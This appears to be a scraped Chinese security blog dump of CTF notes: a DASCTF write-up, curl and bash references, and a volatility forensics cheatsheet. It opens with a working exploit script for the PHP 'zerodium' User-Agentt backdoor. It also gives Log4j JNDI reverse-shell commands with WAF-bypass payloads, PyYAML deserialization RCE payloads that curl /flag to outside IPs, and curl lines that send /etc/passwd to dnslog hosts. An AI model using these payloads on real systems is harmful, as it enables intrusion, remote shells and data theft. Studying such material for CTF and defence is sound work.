&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;, &quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;, &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;, &quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;]TIME_OUT=10print(r&quot;&quot;&quot; _____ _ _ _____ _____ _ _ ____ _ _ | __ \\ | | | || __ \\ / ____|| | | | | _ \\ | | | | | |__) || |__| || |__) || (___ | |_ _ _ __| | _ _ | |_) | __ _ ___ | | __ __| | ___ ___ _ __ | ___/ | __ || ___/ \\___ \\ | __|| | | | / _` || | | | | _ &lt; / _` | / __|| |/ // _` | / _ \\ / _ \\ | &#x27;__| | | | | | || | ____) || |_ | |_| || (_| || |_| | | |_) || (_| || (__ | &lt;| (_| || (_) || (_) || | |_| |_| |_||_| |_____/ \\__| \\__,_| \\__,_| \\__, | |____/ \\__,_| \\___||_|\\_\\\\__,_| \\___/ \\___/ |_| __/ | |___/ Usage &amp; e.g. : Target Url: localhost/flag.php Input Your Command: phpinfo(); Notice: Command Must Be PHP Function, If You Want To Execute OS Command, Use: system(&#x27;YOUR COMMAND&#x27;); By:Sp4ce Have Fun&quot;&quot;&quot;)def checkTarget(url): poc = &#123; &quot;Accept-Charset&quot;: &quot;cGhwaW5mbygpOw==&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; try: pocRequest = requests.get(url, headers=poc,timeout=TIME_OUT) if &quot;phpinfo&quot; in str(pocRequest.content): print(&#x27;[+] Target is vulnerable.&#x27;) return True else: print(&#x27;[-] Target is NOT vulnerable.&#x27;) return False except : print(&#x27;[-] Looks Like Something Wrong.&#x27;)def exploit(url,command): headers = &#123;&#125; headers[&#x27;User-Agent&#x27;] = choice(USER_AGENTS) headers[&#x27;Accept-Encoding&#x27;] = &#x27;gzip,deflate&#x27; headers[&#x27;Accept-Charset&#x27;] = command try: request = requests.get(url, headers=headers) if request.status_code == 200: print(&#x27;[+] Command Execute Successful.&#x27;) print(request.text) else: print(&#x27;[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.&#x27;) except: print(&#x27;[-] Looks Like Something Wrong.\\n&#x27;)if __name__ == &quot;__main__&quot;: while True: url = input(&quot;Target Url:\\n&quot;) if &#x27;http&#x27; not in url: url = &quot;http://&quot; + url print(&#x27;[i] Checking Target...&#x27;) if checkTarget(url): cmd = input(&quot;Input Your Command:\\n&quot;) command = base64.b64encode(cmd.encode(&#x27;utf-8&#x27;)) exploit(url,command) zerodium 后门 列目录：User-Agentt: zerodiumsystem(&#39;ls /&#39;); 读文件：User-Agentt: zerodiumsystem(&#39;cat /flag&#39;); log4j2 漏洞（CVE-2021-44228） 步骤： 在vps上通过 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 启动监听 123java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny54eHgueHh4LjIyMC8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;47.xxx.xxx.220&quot;# YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny54eHgueHh4LjIyMC8yMzMzIDA+JjE= 为 bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.220/2333 0&gt;&amp;1, 用于反弹shell 将payload填入找到的漏洞处 1$&#123;jndi:ldap:$&#123;sys:file.separator&#125;$&#123;sys:file.separator&#125;47.xxx.xxx.220:1389$&#123;sys:file.separator&#125;ge5udq&#125; 参考：Apache Log4j2漏洞复现-反弹shell 绕过： 12345678$&#123;jndi:ladp://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;::-j&#125;ndi:rmi://xxxxxx.dnslog.cn/exp&#125;$&#123;jndi:rmi://xxxxxx.dnslog.cn&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxxxxx.dnslog.cn/exp&#125; PyYAML漏洞（CVE-2020-1747） 版本：5.3 123456789# pyyaml==5.3 required. Vulnerability has been fixed in 5.3.1# More: ret2libc&#x27;s report in https://github.com/yaml/pyyaml/pull/386# Explanation: https://2130706433.net/blog/pyyaml/from yaml import *with open(&#x27;payload.yaml&#x27;,&#x27;rb&#x27;) as f: content = f.read()data = load(content, Loader=FullLoader) # Using vulnerable FullLoader RCE： 12345678910# payload.yaml# The `extend` function is overriden to run `yaml.unsafe_load` with # custom `listitems` argument, in this case a simple curl request- !!python/object/new:yaml.MappingNode listitems: !!str &#x27;!!python/object/apply:subprocess.Popen [[&quot;curl&quot;, &quot;http://127.0.0.1/rce&quot;]]&#x27; state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load 123!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval ,[&quot;\\x5f\\x5fimport\\x5f\\x5f(&#x27;os&#x27;)\\x2esystem(&#x27;curl http://xxx.xxx.xxx.xxx:1234 -d@/flag&#x27;)&quot;]]] 123!!python/object/new:type args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;] listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;curl -d @/flag http://111.111.111.111:8082&#x27;)&quot; 参考： 浅谈PyYAML反序列化漏洞 PyYAML反序列化防御和ByPass uiuctf 2020","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://lazzzaro.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"https://lazzzaro.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"内网","slug":"内网","permalink":"https://lazzzaro.github.io/tags/%E5%86%85%E7%BD%91/"}],"author":"Lazzaro"},{"title":"命令行工具","slug":"misc-命令行工具","date":"2020-07-05T12:12:03.000Z","updated":"2022-01-03T06:31:08.187Z","comments":true,"path":"2020/07/05/misc-命令行工具/","link":"","permalink":"https://lazzzaro.github.io/2020/07/05/misc-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/","excerpt":"","text":"​ 模拟工具RequestBin：http://requestbin.net/ （调试http/https交互） Ceye：http://ceye.io/ （检测带外流量的监控平台，如DNS查询和HTTP请求，收集信息SSRF / XXE / RFI / RCE） DNSlog：http://www.dnslog.cn/ （解析子域名存放的漏洞，发起DNS请求，日志反弹） bashupload：https://bashupload.com/ （从命令行上传文件，分析给其他的服务器） ​ Linux Bash内置变量 BASH用途：显示bash的完整路径名。通常是：/bin/bash或/usr/local/bin/bash。 BASH_VERSION用途：bash的版本。 FUNCNAME用途：在函数式执行期，此变量内容即为函数式的名称。 HISTCMD用途：当前指令执行完后，它在历史指令中的排列编号（指定给下一个指令用的历史命令编号）。 HISTCONTROL用途：控制指令是否存入历史脚本文件中。 HISTCONTROL有3个可能的设定值： ignorespace: 凡是指令开头有空格符的，不存入历史脚本文件中。 ignoredups: 连续重复的指令，只存一个。 ignoreboth: 结合前两者的功能。 HISTFILE用途：设定历史脚本文件的路径文件名。通常是在：家目录/.bash_history HISTFILESIZE用途：设定历史脚本文件存储指令的最大行数。 HISTIGNORE用途：不存入历史脚本文件的指令样式，以 : 隔开。 HOME用途：设定用户的家目录位置。通常，root的家目录在/root，一般用户的家目录在/home/账号。替换~的结果，就是HOME变量值。 HOSTNAME用途：显示主机名。 HOSTTYPE用途：显示主机形态。 IFS用途：定义字段分隔字符。默认值为：空格符、tab字符、换行字符(newline)。 MACHTYPE用途：描述主机形态的GNU格式：cpu-公司-系统。 MAIL用途：显示当前用户邮件目录。 MAILCHECK用途：每隔多久就检查一次邮件。通常默认是60秒。 PATH用途：命令的搜寻路径。 PPID用途：父进程的进程编号。 RANDOM用途：随机函数。 此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。 REPLY用途：select和read没有设定读取变量时，默认的变量名称为REPLY。 SHLVL用途：子shell的层级数。 $1~$n用途：位置参数。 传入程序或函数式的参数，第一个参数$1，第二参数$2，其他类推。 请注意，若位置参数n超过9以上，则要用$&#123;n&#125;来表示。 $0代表执行程序的名称。 $*用途：代表所有的位置参数，并且视为一个字符串。 如：test.sh ABC 123 xyz，则$*的内容为字符串ABC 123 xyz $@用途：代表所有的位置参数，但$@代表各位置参数组成的串行。 如：test.sh ABC 123 xyz，则$@的内容为ABC、123、xyz这3个字符串。 $#用途：位置参数的个数。 如：test.sh ABC 123 xyz，有3个参数，$#的值为3。 $?用途：上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。 $$用途：目前bash shell的进程编号。 $_用途： a. script执行时，bash的绝对路径。 b. 上一个命令执行时，最后一个位置参数，如上一个命令是：test.sh ABC 123 xyz，则$_的值为xyz。 c. 检查邮件时，$_的值为邮件文件名。 ​ curlcurl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。 它的功能非常强大，命令行参数多达几十种。如果熟练的话，完全可以取代 Postman 这一类的图形界面工具。 不带有任何参数时，curl 就是发出 GET 请求。 $ curl https://www.example.com 执行命令： 12$ curl http://requestbin.net/r/1kiej1p1?p=`whoami`$ curl `cat /etc/passwd|base64`.xxxxxx.dnslog.cn #dnslog带外 参数说明： -A 指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]。 1$ curl -A &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27; https://google.com -b 向服务器发送 Cookie。 1$ curl -b &#x27;foo=bar&#x27; https://google.com 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。 -c -c参数将服务器设置的 Cookie 写入一个文件。 1$ curl -c cookies.txt https://www.google.com 上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。 -d -d参数用于发送 POST 请求的数据体。 123$ curl -d&#x27;login=emma&amp;password=123&#x27;-X POST https://google.com/login # 或者 $ curl -d &#x27;login=emma&#x27; -d &#x27;password=123&#x27; -X POST https://google.com/login 使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。 --data-urlencode --data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。 1$ curl --data-urlencode &#x27;comment=hello world&#x27; https://google.com/login 上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。 -e -e参数用来设置 HTTP 的标头Referer，表示请求的来源。 1curl -e &#x27;https://google.com?q=example&#x27; https://www.example.com 上面命令将Referer标头设为https://google.com?q=example。 -G -G参数用来构造 URL 的查询字符串。 1$ curl -G -d &#x27;q=kitties&#x27; -d &#x27;count=20&#x27; https://google.com/search 上面命令会发出一个 GET 请求，实际请求的 URL 为https://google.com/search?q=kitties&amp;count=20。如果省略--G，会发出一个 POST 请求。 如果数据需要 URL 编码，可以结合--data--urlencode参数。 1$ curl -G --data-urlencode &#x27;comment=hello world&#x27; https://www.example.com -H -H参数添加 HTTP 请求的标头。 1$ curl -H &#x27;Accept-Language: en-US&#x27; https://google.com 上面命令添加 HTTP 标头Accept-Language: en-US。 1$ curl -H &#x27;Accept-Language: en-US&#x27; -H &#x27;Secret-Message: xyzzy&#x27; https://google.com 上面命令添加两个 HTTP 标头。 1$ curl -d &#x27;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#x27; -H &#x27;Content-Type: application/json&#x27; https://google.com/login 上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。 1$ curl -H &#x27;User-Agent: php/1.0&#x27; https://google.com 上面命令通过-H参数直接指定标头，更改User-Agent。 1$ curl -H &#x27;Referer: https://google.com?q=example&#x27; https://www.example.com 上面命令通过直接添加标头Referer，达到同样效果。 1$ curl -H &#x27;Host: xxxx&#x27; https://www.example.com 上面命令设置Host绕过主机头检测，替代更改host文件的繁琐操作。 1$ curl -H &#x27;Content-Type:application/json&#x27; https://www.example.com 上面命令设置请求头Content-Type，以json格式发送。 1$ curl -H &#x27;Range: bytes=0-10&#x27; https://www.example.com 上面命令请求资源的部分内容（不包括响应头的大小），单位是byte，即字节，从0开始。 格式： Range: bytes=start-end 如： Range: bytes=10- ：第10个字节到最后一个字节之间的数据 Range: bytes=40-100 ：第40个字节到第100个字节之间的数据 -i -i参数打印出服务器回应的 HTTP 标头。 1$ curl -i https://www.example.com 上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。 -L -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。 1$ curl -L -d &#x27;tweet=hi&#x27; https://api.twitter.com/tweet -o -o参数将服务器的回应保存成文件，等同于wget命令。 1$ curl -o example.html https://www.example.com 上面命令将www.example.com保存成example.html。 -O -O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。 1$ curl -O https://www.example.com/foo/bar.html 上面命令将服务器回应保存成文件，文件名为bar.html。 -u -u参数用来设置服务器认证的用户名和密码。 1$ curl -u &#x27;bob:12345&#x27; https://google.com/login 上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。 curl 能够识别 URL 里面的用户名和密码。 1$ curl https://bob:12345@google.com/login 上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。 1$ curl -u &#x27;bob&#x27; https://google.com/login 上面命令只设置了用户名，执行后，curl 会提示用户输入密码。 -v -v参数输出通信的整个过程，用于调试。 1$ curl -v https://www.example.com -F 或 --form 使用-F 或 --form来上传文件，这样会给请求添加 enctype=&quot;multipart/form-data&quot; 参数。 1$ curl -F &#x27;img_avatar=@/home/petehouston/hello.txt&#x27; http://localhost/upload 想要同时上传多个文件的话，只需要添加多个 -F 选项就可以了。 1$ curl -F &#x27;fileX=@/path/to/fileX&#x27; -F &#x27;fileY=@/path/to/fileY&#x27; ... http://localhost/upload 想要上传文件数组的话，只需要添加多个 -F 选项并命名成相同名字的数组就可以了。 1$ curl -F &#x27;files[]=@/path/to/fileX&#x27; -F &#x27;files[]=@/path/to/fileY&#x27; ... http://localhost/upload -x -x参数指定 HTTP 请求的代理。 1$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com 上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。 如果没有指定代理协议，默认为 HTTP。 1$ curl -x james:cats@myproxy.com:8080 https://www.example.com 上面命令中，请求的代理使用 HTTP 协议。","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"命令行","slug":"命令行","permalink":"https://lazzzaro.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Linux","slug":"Linux","permalink":"https://lazzzaro.github.io/tags/Linux/"},{"name":"Bash","slug":"Bash","permalink":"https://lazzzaro.github.io/tags/Bash/"}],"author":"Lazzaro"},{"title":"DASCTF 六月团队赛","slug":"match-DASCTF-六月团队赛","date":"2020-06-26T10:43:38.000Z","updated":"2020-06-27T02:39:25.461Z","comments":true,"path":"2020/06/26/match-DASCTF-六月团队赛/","link":"","permalink":"https://lazzzaro.github.io/2020/06/26/match-DASCTF-%E5%85%AD%E6%9C%88%E5%9B%A2%E9%98%9F%E8%B5%9B/","excerpt":"","text":"​ 没有web手+pwn手伤不起~~ ​ MISCPhysicalHacker 提交flag时请提交{}里面的 已知数据包文件DASCTF_June.cap和hint.txt 由hint.txt脚本知某个密码使用的字典为00000000-99999999（10个值）。 Wireshark打开cap文件，发现里面只有802.11 wireless LAN协议流量，很有可能是WPA或WEP加密后的无线数据包。 Kali下使用工具 aircrack-ng + airdecap-ng 破解： aircrack-ng DASCTF_June.cap 查看ESSID信息 aircrack-ng DASCTF_June.cap -w password.txt 用上面的字典爆破密码 得到密码 66666666，用ESSID和密码解密流量包 airdecap-ng DASCTF_June.cap -e DASCTF -p 66666666 得到新流量包，打开查看TCP数据包，在一个包中找到zip文件数据，导出解压得到flag.txt。 只有一句话“Welcome to DASCTF June, Flag is here but you will never find it noob hacker!” 但Ctrl+A全选发现下方有大量空白不可见字符，猜测为snow隐写， 使用snow隐写工具解密： snow.exe -d flag.txt 得到字符串base32解码即可。 ​ BaiduYun&amp;Gcode 你了解百度网盘的秒传原理么？ hint:数据库中的xshadow.png与平台首页中xshadow.png的前256KB相同 已知一份百度云盘的用户数据文件夹users。这题出得不错，了解百度网盘的秒传原理。 秒传原理：通过检测文件大小和md5值，或者再加上其他如文件前256KB切片的md5值的信息，若云端有相同的文件，则直接进行云端拷贝。 参考： 利用BaiduPCS-Go批量秒传与备份 https://github.com/felixonmars/BaiduPCS-Go 下载BaiduPCS-Go工具，验证自己的百度云账号密码登录。 从users提取 BaiduYunCacheFileV0.db 中的数据库信息，用SQLite Expert查看器打开db文件，找到cache数据记录： 由提示肯定是和xshadow.png有关了，用BaiduPCS-Go工具里的手动秒传功能 BaiduPCS-Go ru -length=&lt;文件的大小&gt; -md5=&lt;文件的md5值&gt; -slicemd5=&lt;文件前256KB切片的md5值(可选)&gt; -crc32=&lt;文件的crc32值(可选)&gt; &lt;保存的网盘路径, 需包含文件名&gt; 放入得到的xshadow.png信息： BaiduPCS-Go ru -length=30038207 -md5=72b6273dc5c54e8af2490e4acd3a6a3f /temp 发现运行不成功，需要slicemd5值，那么需要 xshadow.png 的前256KB切片的md5了。 根据提示，在首页找到 https://www.linkedbyx.com/static/xshadow.png 下载，kali下取前256KB切片。 split -b 256K xshadow.png 生成文件xaa md5sum xaa 求切片md5值 重新运行命令： BaiduPCS-Go ru -length=30038207 -md5=72b6273dc5c54e8af2490e4acd3a6a3f -slicemd5=e973409c4ac718e158be4492ab5d9999 /temp 成功在百度网盘得到云上的xshadow.png文件。 下载，用binwalk提取出zip文件，解压得到flag.gcode。 了解到gcode文件为3D模型切片软件输出的文件类型，可以用下面三个任意一个网页在线预览： http://gcode.ws/https://ncviewer.com/http://jherrm.com/gcode-viewer/ 试了很多次在线加载，挂着两个虚拟机，300w+行代码，打开到一半直接内存不足网页崩溃，求助64G大内存神机大佬，在线绘制得到 想到是3D绘制，尝试旋转各视角，在侧面发现玄机，调整好角度记录最终flag。 膜出题大佬~~ ​ Keyboard I hid the flag. Go find it 已知文件Keyboard.raw和Secret，貌似是4月赛原题。 内存取证： volatility -f Keyboard.raw imageinfo 得到profile信息 Win7SP1x64， volatility -f Keyboard.raw --profile=Win7SP1x64 pslist 发现可疑进程 keyboard-log.exe 和 VeraCrypt.exe，分别是键盘记录器和加密器， 搜索 keyboard-log 相关文件 volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard dump导出可疑 t.txt 文件。 CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA 像是密码的密文，加密方法是上面的 CTFWIKI-CRYPTO-ABC， 猜测QWERTY键盘密码，脚本还原得VERACRYPTPASSWORDISKEYBOARDDRAOBYEK。 用VeraCrypt挂载加密分区文件Secret，得到一个vhd虚拟磁盘文件，再挂载得到flag.txt，打开发现为假flag， NTFS隐写工具搜一搜，得到正确flag。 ​ 透明度 你知道RGBA吗？ 已知一张png图，题面RGBA提示LSB隐写，用zsteg工具查看： zsteg -a Rgba.png 发现 b8,a,lsb,xy 区域有zip文件，导出内容： zsteg -E &quot;b8,a,lsb,xy&quot; Rgba.png &gt; out.zip zip内txt文件名提示密码是 nep?? 在ARCHPR中设置掩码爆破得zip密码为：nepnb，解压得flag。 ​ CRYPTOGemini_Man 貌似N很大噢，耐心点总能解出来 已知很大的 $C$ 和 $N$，无法用常规方法分解，由开局的提示”孪生素数“或题目”Gemini_Man“，猜测 $q=p+2$。 代入 $pq=N$，解一元二次方程得到正确 $p,q$ 值。 题目未给 $e$ ，猜测为常见的 $e=65537$ ，常规脚本放到Kali环境跑出明文 $m$。 （未知原因Windows环境下 pow(C,d,N) 死活跑不出） ​ HardKnapsack1 HardKnapsack1 求解背包加密，在Sage中采用LLL算法现成脚本跑出结果： 1234567891011121314151617181920212223242526272829303132333435###Sage###import binascii# open the public key and strip the spaces so we have a decent arrayfileKey = open(&quot;pub.Key&quot;, &#x27;rb&#x27;)pubKey = fileKey.read().replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;L&#x27;, &#x27;&#x27;).strip(&#x27;[]&#x27;).split(&#x27;,&#x27;)nbit = len(pubKey)# open the encoded messagefileEnc = open(&quot;enc.txt&quot;, &#x27;rb&#x27;)encoded = fileEnc.read().replace(&#x27;L&#x27;, &#x27;&#x27;)print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] print(M) PS：带约束条件的HardKnapsack2用LLL跑不出结果，待学习。 ​ REVERSEeasy_maze 走出来便是英雄！ps:将得到的字符串md5加密提交 迷宫题，IDA查看字符串发现迷宫阵字符串： OOOO0000#000OO0OOOOOO0OO0000OO00OOOOO0OO0OOOO000OO00OO00OOOOO0OO0OOOOOO0000OOOOOOOOOOOOOOOOOOOOOOOO 结合main函数伪代码易知上下左右控制键对应ujhk，且迷宫大小为10×10，#为终点，0为路径，X（实际为空）为起点，调整为： XOOOO0000# 000OO0OOOO OO0OO0000O O00OOOOO0O O0OOOO000O O00OO00OOO OO0OO0OOOO OO0000OOOO OOOOOOOOOO OOOOOOOOOO 得到路径字符串：jkkjjhjjkjjkkkuukukkuuhhhuukkkk，md5加密提交。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"取证","slug":"misc-取证","date":"2020-06-19T17:48:32.000Z","updated":"2022-10-15T18:10:35.529Z","comments":true,"path":"2020/06/20/misc-取证/","link":"","permalink":"https://lazzzaro.github.io/2020/06/20/misc-%E5%8F%96%E8%AF%81/","excerpt":"","text":"取证（Forensic）内存取证工具：volatility，DiskGenius volatilityhttps://github.com/volatilityfoundation/volatility 镜像基本信息（得到profile）： volatility -f mem.data imageinfo python3 vol.py -f mem.data windows.info 搜索进程、导出内存块： volatility -f mem.data --profile=XXX pslist python3 vol.py -f mem.data windows.pstree volatility -f mem.data --profile=XXX memdump -p 2768 -D ./ 查看命令行输入、命令行历史记录： volatility -f mem.data --profile=XXX cmdline python3 vol.py -f mem.data windows.cmdline volatility -f mem.data --profile=XXX cmdscan volatility -f mem.data --profile=XXX consoles 查看可疑文件、导出文件： volatility -f mem.data --profile=XXX filescan | grep -E &quot;.zip|.rar|.jpg|.png|.txt|.bmp|.7z&quot; volatility -f mem.data --profile=XXX dumpfiles -D ./ -Q 0x000000001e85f430 -n python3 vol.py -f mem.data windows.dumpfiles --pid 8180 特殊文件后缀： evtx - Windows系统日志 无法导出.dat文件，加 -u 参数（-u = —unsafe relax safety constraints more data）volatility -f mem.data dumpfiles -r pdf$ -i --name -D dumpfiles/ -u dumpfiles 参数：参考：https://www.andreafortuna.org/2017/07/17/volatility-my-own-cheatsheet-part-4-kernel-memory-and-objects12345678910111213141516-r REGEX, --regex=REGEX Dump files matching REGEX-i, --ignore-case Ignore case in pattern match-o OFFSET, --offset=OFFSET Dump files for Process with physical address OFFSET-Q PHYSOFFSET, --physoffset=PHYSOFFSET Dump File Object at physical address PHYSOFFSET-D DUMP_DIR, --dump-dir=DUMP_DIR Directory in which to dump extracted files-S SUMMARY_FILE, --summary-file=SUMMARY_FILE File where to store summary information-p PID, --pid=PID Operate on these Process IDs (comma-separated)-n, --name Include extracted filename in output file path-u, --unsafe Relax safety constraints for more data-F FILTER, --filter=FILTER Filters to apply (comma-separated) 查看内存中记录的当时正在运行的程序、运行次数、最后运行时间： volatility -f mem.data --profile=XXX userassist 查看截图： volatility -f mem.data --profile=XXX screenshot -D ./ 查看剪贴板： volatility -f mem.data --profile=XXX clipboard volatility -f mem.data --profile=XXX clipboard -v 查看当前notepad文本： volatility -f mem.data --profile=XXX notepad 查看账户与密码： volatility --plugins=plugins/ -f mem.data --profile=XXX mimikatz 查看系统用户名： volatility -f mem.data --profile=XXX printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; 查看最后登录系统的账户： volatility -f mem.data --profile=xxx printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; 查看网络连接： volatility -f mem.data --profile=XXX netscan 查看缓存在内存中的注册表： volatility -f mem.data --profile=XXX hivelist 提取注册表： volatility -f mem.data --profile=XXX dumpregistry （dumpregistry插件） 提取注册表system和SAM虚拟地址的hash内容： volatility -f mem.data --profile=XXX hashdump volatility -f mem.data --profile=XXX hashdump -y 0xfffff8a000024010 -s 0xfffff8a00167a010 -D ./ 提取内存中主文件表（MFT）记录信息（文件属性）： volatility -f mem.data --profile=XXX mftparser &gt; mft.txt 提取IE历史记录： volatility -f mem.data --profile=XXX iehistory 显示环境变量： volatility -f mem.data --profile=XXX envars python3 vol.py -f mem.data windows.envars 提取Chrome历史记录（插件）： Chrome Cookies 的本质是 SQLite。 Chrome 80 以后更改了 Cookies 的加密方法。 cookies 表 encrypted_value 字段不为 V10 / V11 开头，是 Chrome 79 及以前版本的 Cookies。 volatility --plugins=plugins/ -f mem.data chromehistory volatility --plugins=plugins/ -f mem.data chromevisits -Q（visits – QUICK） volatility --plugins=plugins/ -f mem.data chromevisits（visits – FULL） volatility --plugins=plugins/ -f mem.data chromesearchterms volatility --plugins=plugins/ -f mem.data chromedownloads（Standard Text Output） volatility --plugins=plugins/ -f mem.data chromedownloads --output=csv（CSV Output） volatility --plugins=plugins/ -f mem.data chromedownloads --output=body（Bodyfile Output） volatility --plugins=plugins/ -f mem.data chromedownloadchains volatility --plugins=plugins/ -f mem.data chromecookies | more（Cookies – Basic example） volatility --plugins=plugins/ -f mem.data chromecookies（Cookies – No Decryption） volatility --plugins=plugins/ -f mem.data chromecookies -K &quot;rq2uadV+VvAD+IBiBeJ75a==&quot;（Cookies – Decrypted） 提取登录密码（LassPass插件）： volatility --plugins=plugins/ -f mem.data --profile=XXX lasspass USB设备相关（usbstor插件）： volatility --plugins=plugins/ -f mem.data --profile=XXX usbstor 特殊进程 便签：StikyNot.exe （.snt 文件，对应路径：C:\\Users\\XXX\\AppData\\Roaming\\Microsoft\\Sticky Notes\\） 联系人：wab.exe （.contact 文件） 插件收集 https://github.com/superponible/volatility-plugins（chromehistory） https://github.com/kevthehermit/volatility_plugins（usbstor） 参考 https://wiki.wgpsec.org/knowledge/ctf/Volatility.html ​ 磁盘取证vmdkAccessData FTK Imager 挂载 Bitlocker 磁盘+内存 Elcomsoft Forensic Disk Decryptor volume选择挂载过的物理磁盘，memory dump选择内存文件，一直往后解密。 ​ 社工（信息收集） 用户名 https://github.com/sherlock-project/sherlock Sherlock Project提供了一个非常强大的命令行工具Sherlock来查找社交网络（社交网络列表及规则可自定义扩展延伸）中的用户名，以方便您进行信息收集相关的安全保障工作。 